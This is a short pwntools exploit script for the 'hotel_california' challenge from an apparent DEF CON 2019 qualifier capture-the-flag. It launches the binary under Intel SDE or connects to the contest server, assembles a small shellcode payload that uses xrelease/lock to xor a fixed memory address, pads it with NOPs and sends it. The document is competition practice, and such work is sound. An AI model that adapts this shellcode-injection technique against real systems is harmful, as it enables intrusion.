#!/usr/bin/env python2
from pwn import *

context.binary = "hotel_california_norandom"

### Interact functions ###

##########################

if args.LOCAL:
    p = process(argv=["/root/Downloads/sde-external-8.35.0-2019-03-11-lin/sde64", "-hle_enabled", "-hle_abort_log", "-debug", "--", context.binary.path])
    """raw_input('\n'.join([
        '',
        'attach {}'.format(p.pid),
        'continue',
        '',
        '[ENTER]'
        ]))"""
    print p.recvlines(3)[-1]
    print "continue"

else:
    p = remote("hotelcalifornia.quals2019.oooverflow.io", 7777)

p.recvuntil(' > ')

payload = asm("""inc rcx; mov di, 0x5555; shl rdi, 32; or rdi, 0x55757260; xrelease lock xor DWORD PTR [rdi], 0x42424242""")
if "\x00" in payload:
    print "null in payload"
    print repr(payload)
    exit()
print "payload len:", len(payload)
p.send(payload + "\x90"*(1024-len(payload)))
#p.send('A'*1024)
p.interactive()
